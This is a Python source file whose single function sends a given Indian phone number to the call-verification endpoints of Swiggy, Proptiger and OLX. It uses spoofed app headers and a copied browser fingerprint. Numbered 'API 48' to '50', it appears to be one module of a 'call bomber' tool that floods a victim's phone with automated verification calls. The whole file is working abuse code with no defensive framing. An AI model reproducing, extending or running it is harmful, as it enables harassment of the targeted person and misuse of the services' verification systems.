import requests

def run_apis9(mobile_no):
    results = []
    
    if not mobile_no.startswith("+"):
        number = "+91" + mobile_no
    else:
        number = mobile_no

    # --- API 48: Swiggy Profile (Alternative) ---
    try:
        headers48 = {
            'Content-Type': 'application/json; charset=utf-8',
            'Host': 'profile.swiggy.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data48 = {
            'mobile': number.replace("+91", "")
        }

        r48 = requests.post(
            'https://profile.swiggy.com/api/v3/app/request_call_verification',
            headers=headers48,
            json=json_data48,
            timeout=10
        )
        results.append({"service": "Swiggy Profile Alt", "status": r48.status_code, "response": r48.text})
        print(f"Swiggy Profile Alt: {r48.status_code}")
    except Exception as e:
        results.append({"service": "Swiggy Profile Alt", "status": "Error", "response": str(e)})
        print(f"Swiggy Profile Alt Error: {e}")

    # --- API 49: Proptiger (Alternative) ---
    try:
        headers49 = {
            'Content-Type': 'application/json; charset=utf-8',
            'Host': 'www.proptiger.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data49 = {
            'contactNumber': number.replace("+91", ""),
            'domainId': '2'
        }

        r49 = requests.post(
            'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
            headers=headers49,
            json=json_data49,
            timeout=10
        )
        results.append({"service": "Proptiger Alt", "status": r49.status_code, "response": r49.text})
        print(f"Proptiger Alt: {r49.status_code}")
    except Exception as e:
        results.append({"service": "Proptiger Alt", "status": "Error", "response": str(e)})
        print(f"Proptiger Alt Error: {e}")

    # --- API 50: OLX (Alternative) ---
    try:
        headers50 = {
            'Host': 'www.olx.in',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'x-panamera-fingerprint': '9293924820144a61d3464cbd1b09fb7f#1758791440451',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
            'accept': '*/*',
            'DNT': '1',
            'content-type': 'application/json',
            'Origin': 'https://www.olx.in',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.olx.in/en-in/items/q-login',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7',
        }

        json_data50 = {
            'grantType': 'retry',
            'method': 'call',
            'phone': number,
            'language': 'en-IN'
        }

        r50 = requests.post(
            'https://www.olx.in/api/auth/authenticate?lang=en-IN',
            headers=headers50,
            json=json_data50,
            timeout=10
        )
        results.append({"service": "OLX Alt", "status": r50.status_code, "response": r50.text})
        print(f"OLX Alt: {r50.status_code}")
    except Exception as e:
        results.append({"service": "OLX Alt", "status": "Error", "response": str(e)})
        print(f"OLX Alt Error: {e}")

    return results
